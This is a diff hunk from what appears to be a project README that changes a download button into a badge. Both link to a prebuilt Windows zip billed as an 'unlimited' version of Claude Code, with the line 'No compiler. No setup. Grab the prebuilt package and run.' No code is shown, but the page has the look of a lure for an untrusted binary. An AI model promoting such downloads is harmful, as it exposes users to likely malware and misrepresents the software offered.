@@ -11,7 +11,7 @@
 
 <p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>
 
-<a href="../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download claude-code-unlimited-v0.1.0-win64.zip" width="720"></a>
+[![Download](https://img.shields.io/badge/%E2%AC%87_Download-v0.1.0_win64-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip)
 
 <br>
 
